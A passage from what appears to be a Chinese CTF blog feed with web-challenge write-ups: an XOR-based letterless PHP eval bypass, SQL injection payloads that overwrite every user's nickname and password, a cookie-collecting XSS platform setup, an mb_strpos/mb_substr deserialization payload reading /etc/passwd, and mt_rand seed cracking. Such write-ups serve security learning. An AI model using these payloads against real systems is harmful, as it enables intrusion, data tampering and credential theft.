alt="image-20241129191723974"></p><blockquote><p>NSSCTF{29cf034a-9052-4aec-b776-b1c8b18b82f5}</p></blockquote><h2 id="HowToGetShell">HowToGetShell</h2><blockquote><p>考点：无字母rce，php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$mess</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$mess</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$mess</span>);</span><br></pre></td></tr></table></figure><p>过滤了所有字母，但有字母，可以使用异或绕过。脚本：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!<span class="variable">@$</span><span class="variable">%^</span>*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span> <span class="comment">#可以用的符号</span></span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span>  <span class="comment">#要构造的命令</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c in answer:</span><br><span class="line">    <span class="keyword">for</span> i in valid:</span><br><span class="line">        <span class="keyword">for</span> j in valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">ord</span>(i)^<span class="keyword">ord</span>(j) == <span class="keyword">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>(tmp1,tmp2)</span><br><span class="line">//0302181 <span class="variable">@[</span><span class="variable">@[</span>_^^ ，所以传入<span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;<span class="variable">@[</span><span class="variable">@[</span>_^^&quot;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mess</span>=<span class="variable">$_</span>=<span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;@[@[_^^&quot;</span><span class="comment">;$_();</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129203748374.png" alt="image-20241129203748374"></p><blockquote><p>NSSCTF{3290ae33-f255-4d6b-9bba-2b1be6ddd485}</p></blockquote><h2 id="Calculate">Calculate</h2><blockquote><p>考点：python,web,脚本编写</p></blockquote><p>直接上脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设这是我们要与之交互的网站的URL</span></span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:28984/&#x27;</span>  <span class="comment"># 请替换为实际的URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个会话来保持cookie和其他会话信息</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则表达式模式来匹配数字或运算符，它们被&lt;div&gt;标签包围</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;div[^&gt;]*?&gt;([0-9+\-*\/=]+)&lt;/div&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环直到我们找到包含关键词&quot;ctf&quot;的页面</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="comment"># 发送GET请求来获取当前页面</span></span><br><span class="line">    response = session.get(url)</span><br><span class="line">    html_content = response.text</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用BeautifulSoup解析HTML内容</span></span><br><span class="line">    soup = BeautifulSoup(html_content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查找所有包含数字或运算符的&lt;div&gt;标签</span></span><br><span class="line">    divs = soup.find_all(<span class="string">&#x27;div&#x27;</span>, text=re.<span class="built_in">compile</span>(<span class="string">r&#x27;[0-9+\-*\/=]&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用正则表达式从标签中提取数字或运算符</span></span><br><span class="line">    tokens = pattern.findall(<span class="built_in">str</span>(divs))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 拼接成一个数学表达式（注意：这里假设表达式是简单的，没有括号）</span></span><br><span class="line">    <span class="comment"># 我们需要去除任何多余的空格和可能的=符号（它可能是表达式的一部分或用于提示用户输入）</span></span><br><span class="line">    <span class="comment"># 并且我们假设=符号后面不会紧跟数字或运算符（即它是表达式的结尾）</span></span><br><span class="line">    expression_parts = [token <span class="keyword">for</span> token <span class="keyword">in</span> tokens <span class="keyword">if</span> token != <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    expression = <span class="string">&#x27;&#x27;</span>.join(expression_parts).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(expression)</span><br><span class="line">    <span class="comment"># 计算表达式的值（注意：这里使用eval有安全风险，但在本例中为了简化而使用）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error evaluating expression &#x27;<span class="subst">&#123;expression&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 为了避免过快地发送请求，我们添加了一个短暂的延迟（至少1秒）</span></span><br><span class="line">    <span class="comment"># 根据题目要求，我们不能在1秒内回答一个问题，所以这里使用0.5秒的延迟</span></span><br><span class="line">    time.sleep(<span class="number">1.1</span>)</span><br><span class="line">    <span class="comment"># 准备POST数据</span></span><br><span class="line">    post_data = &#123;<span class="string">&#x27;ans&#x27;</span>: result&#125;</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="comment"># 发送POST请求将答案发送回服务器</span></span><br><span class="line">    post_response = session.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查响应内容是否包含关键词&quot;ctf&quot;</span></span><br><span class="line"><span class="built_in">print</span>(post_response.text)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 关闭会话</span></span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure><blockquote><p>NSSCTF{32a5eadd-b078-4e0c-9570-1b2852476085}</p></blockquote><h2 id="ezsql">ezsql</h2><blockquote><p>考点：sql注入</p></blockquote><p>先扫一下目录，发现源码，审计源码，发现sql注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231234785.png" alt="image-20241129231234785"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231223286.png" alt="image-20241129231223286"></p><p>根据提示，存在sql注入，直接sqlmap扫</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129230333540.png" alt="image-20241129230333540"></p><p>发现在年龄处存在sql注入漏洞，且根据payload可以看出是数字型注入</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改当前表所有nickname为444</span><br><span class="line">nickname=aa&amp;age=11,nickname=444%23&amp;description=111&amp;token=</span><br><span class="line">修改当前表所有password为123</span><br><span class="line">nickname=aa&amp;age=11,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=111&amp;token=</span><br><span class="line"><span class="punctuation">#</span>0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(‘123’))</span><br><span class="line"><span class="punctuation">#</span><span class="keyword">urlencode</span><span class="params">(#)</span>=%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231014113.png" alt="image-20241129231014113"></p><blockquote><p>NSSCTF{3a6a5fad-87c3-4a7a-a6b6-35f1a532b42e}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧HUBUCTF-2022-新生赛-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3ngx1ng.github.io/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>XSS在线平台使用</title>
    <link href="https://m3ngx1ng.github.io/posts/169f5f8e.html"/>
    <id>https://m3ngx1ng.github.io/posts/169f5f8e.html</id>
    <published>2024-11-27T16:00:00.000Z</published>
    <updated>2024-12-02T09:25:18.658Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
    
    
    <summary type="html">XSS在线平台使用</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://m3ngx1ng.github.io/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>mb_strpos与mb_substr错位索引</title>
    <link href="https://m3ngx1ng.github.io/posts/c81521cb.html"/>
    <id>https://m3ngx1ng.github.io/posts/c81521cb.html</id>
    <published>2024-11-25T16:00:00.000Z</published>
    <updated>2024-12-02T09:01:07.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mb-strpos与mb-substr错位索引">mb_strpos与mb_substr错位索引</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span> mb_substr和mb_strpos函数漏洞</span><br><span class="line">mb_strpos() 和 mb_substr() 是 PHP 中用于处理多字节字符的函数，专门用于处理 UTF<span class="number">-8</span> 或其他多字节编码的字符串。</span><br><span class="line">(<span class="number">1</span>)mb_strpos: 用于查找一个字符串在另一个字符串中第一次出现的位置（索引），返回结果是该子字符串第一次出现的位置（索引）。</span><br><span class="line">mb_strpos(<span class="built_in">string</span> $haystack, <span class="built_in">string</span> $needle, <span class="built_in">int</span> $offset = <span class="number">0</span>, <span class="built_in">string</span> $encoding = <span class="literal">null</span>): <span class="built_in">int</span>|<span class="literal">false</span></span><br><span class="line">    $haystack：要在其中搜索子字符串的源字符串。</span><br><span class="line">    $needle：要搜索的子字符串。</span><br><span class="line">    $offset（可选）：从哪个位置开始搜索，默认为 <span class="number">0</span>。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)mb_substr: 用于获取一个字符串的子串，返回结果是指定位置和长度的子字符串。</span><br><span class="line">mb_substr(<span class="built_in">string</span> $string, <span class="built_in">int</span> $start, <span class="built_in">int</span> $length = <span class="literal">null</span>, <span class="built_in">string</span> $encoding = <span class="literal">null</span>): <span class="built_in">string</span>|<span class="literal">false</span></span><br><span class="line">    $string：要截取的原始字符串。</span><br><span class="line">    $start：截取的起始位置。如果是负数，则表示从末尾开始计数。</span><br><span class="line">    $length（可选）：要截取的长度。如果未指定，则默认截取至字符串的末尾。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当以 <span class="string">\xF0</span> 开头的字节序列出现在 UTF-<span class="number">8</span> 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-<span class="number">8</span> 编码规范定义了以 <span class="string">\xF0</span> 开头的字节序列用于编码较大的 Unicode 字符。</span><br><span class="line">不符合<span class="number">4</span>位的规则的话，mb_substr和mb_strpos执行存在差异：</span><br><span class="line">(<span class="number">1</span>)mb_strpos遇到<span class="string">\xF0时，会把无效字节先前的字节视为一个字符，然后从无效字节重新开始解析</span></span><br><span class="line">mb_strpos(<span class="string">&quot;\xf0\x9fAAA&lt;BB&quot;</span>, <span class="string">&#x27;&lt;&#x27;</span>); <span class="comment">#返回4 \xf0\x9f视作是一个字节，从A开始变为无效字节 #A为\x41  上述字符串其认为是7个字节</span></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)mb_substr遇到<span class="string">\xF0时，会把无效字节当做四字节Unicode字符的一部分，然后继续解析</span></span><br><span class="line">mb_substr(<span class="string">&quot;\xf0\x9fAAA&lt;BB&quot;</span>, <span class="number">0</span>, <span class="number">4</span>); <span class="comment">#&quot;\xf0\x9fAAA&lt;B&quot; \xf0\x9fAA视作一个字符 上述字符串其认为是5个字节</span></span><br><span class="line"></span><br><span class="line">结论：mb_strpos相对于mb_substr来说，可以把索引值向后移动</span><br></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span> mb_substr和mb_strpos函数漏洞与本题结合</span><br><span class="line">通过控制C的长度可以控制我们想要执行$key的长度</span><br><span class="line">通过控制B我们可以控制索引值需要提前几位</span><br><span class="line">每发送一个%f0abc，mb_strpos认为是<span class="number">4</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">3</span>个字节</span><br><span class="line">每发送一个%f0%9fab,mb_strpos认为是<span class="number">3</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">2</span>个字节</span><br><span class="line">每发送一个%f0%9f%9fa,mb_strpos认为是<span class="number">2</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">1</span>个字节</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$readfile</span> = <span class="keyword">new</span> <span class="title function_ invoke__">read_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]);</span><br><span class="line">    <span class="variable">$read</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]:<span class="string">&quot;I_want_to_Read_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start_Funny_CTF!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>审计上述代码，发现传入参数start和read，会拼接read和realfile的序列化。</p><p>根据代码知道，在调用函数截取的时候是以 “[” 开始的，但是read里面又不能有 “[”，所以一定只能截取[]内的序列化。但是只有变量start是可控的，其它不可控，看似无解，但可利用上述的漏洞，让其发生错位索引，从而执行我们自己传入的序列化列表。</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果start=gxngxngxn，序列化为：</span><br><span class="line"><span class="symbol">O:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;read_file&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;start&quot;</span></span>;<span class="symbol">s:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;gxngxngxn&quot;</span></span>;<span class="symbol">s:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;filename&quot;</span></span>;<span class="symbol">s:</span><span class="number">11</span><span class="symbol">:<span class="string">&quot;/etc/passwd&quot;</span></span>;&#125;</span><br><span class="line"></span><br><span class="line">如果我们自己构造一个序列化表传入，start=<span class="symbol">O:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;read_file&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;start&quot;</span></span>;<span class="symbol">s:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;gxngxngxn&quot;</span></span>;<span class="symbol">s:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;filename&quot;</span></span>;<span class="symbol">s:</span><span class="number">55</span><span class="symbol">:<span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span></span>;&#125;</span><br><span class="line">序列化结果为：</span><br><span class="line"><span class="symbol">O:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;read_file&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;start&quot;</span></span>;<span class="symbol">s:</span><span class="number">126</span><span class="symbol">:<span class="string">&quot;O:9:&quot;</span>read_file<span class="string">&quot;:2:&#123;s:5:&quot;</span>start<span class="string">&quot;;s:9:&quot;</span>gxngxngxn<span class="string">&quot;;s:8:&quot;</span>filename<span class="string">&quot;;s:55:&quot;</span>php</span><span class="symbol">://filter/convert</span>.base64-encode/resource=<span class="regexp">/etc/passwd</span><span class="string">&quot;;&#125;&quot;</span>;<span class="symbol">s:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;filename&quot;</span></span>;<span class="symbol">s:</span><span class="number">11</span><span class="symbol">:<span class="string">&quot;/etc/passwd&quot;</span></span>;&#125;</span><br><span class="line"></span><br><span class="line">相比较，前面多了一串：</span><br><span class="line"><span class="symbol">O:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;read_file&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;start&quot;</span></span>;<span class="symbol">s:</span><span class="number">126</span><span class="symbol">:<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="symbol">刚好多了38个字符，就可以通过传参read来利用上述漏洞，让他们错位38个索引</span></span></span><br></pre></td></tr></table></figure><blockquote><p>payload:</p></blockquote><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?read=<span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0</span><span class="meta">%9f</span><span class="meta">%9fa</span><span class="meta">%f0</span><span class="meta">%9f</span><span class="meta">%9fa</span>&amp;<span class="keyword">start</span>=O:<span class="number">9</span>:<span class="string">&quot;read_file&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;gxngxngxn&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">55</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接下来分析一下，传进去后，在传入截取函数前，它们会组合成：</p><p>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa[O:9:“read_file”:2:{s:5:“start”;s:126:“O:9:“read_file”:2:{s:5:“start”;s:9:“gxngxngxn”;s:8:“filename”;s:55:“php://filter/convert.base64-encode/resource=/etc/passwd”;}”;s:8:“filename”;s:11:“/etc/passwd”;}]</p><p>根据上述漏洞，mb_strpos索引&quot;[“时，会索引到 12x4+2x2+1-1 = 52，即”[&quot;下标是52</p><p>mb_substr在截取时，就会从下标为53的截取。 53=12x1+1x2+1+38+1-1，刚好绕过了前面的38个字符串，从而反序列化我们自己传入的序列化表。</p></blockquote>]]></content>
    
    
    <summary type="html">🥧mb_strpos与mb_substr错位索引</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3ngx1ng.github.io/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>随机数种子爆破</title>
    <link href="https://m3ngx1ng.github.io/posts/b4b5a295.html"/>
    <id>https://m3ngx1ng.github.io/posts/b4b5a295.html</id>
    <published>2024-11-25T16:00:00.000Z</published>
    <updated>2024-12-02T08:49:30.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="随机数种子爆破">随机数种子爆破</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165931510.png" alt="image-20241116165931510"></p><p>在PHP中，变量以$符号开头，后面拼接变量名。上述代码的基本 含义是:从$str变量中随机取32次字符(字符可重复)，并拼接成字符 串，最后将该字符串赋值给变量$password。执行代码后会输出 $password变量的前10个字节，此时通过POST请求传递password参数到 服务端，如果password参数的值与$password变量的值完全相等，那么 就会输出flag。</p><p>理论上，如果选取字符的时候是完全随机的，那么几乎不可能出现 password参数值与$password变量值相等的情况(概率极低)。但由于 代码中使用mt_rand()函数来生成随机数，因此如果可以得知该函数生 成的一段随机数序列，就可以通过工具爆破出其选取的随机数种子 (该种子由$_Session[‘seed’]变量生成)，从而预测之后的所有随机数序 列。在这里，我们使用php_mt_seed工具来爆破随机数种子。该工具的 下载地址为:<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-">https://www.openwall.com/php_mt_seed/php_mt_seed-</a> 4.0.tar.gz</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165647076.png" alt="image-20241116165647076"></p><p>访问题目页面，可得到前10个字节的随机字符，将输出的随机字符转换为php_mt_seed可识别的数据格式。使用</p><p>Python3脚本进行转换:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165703575.png" 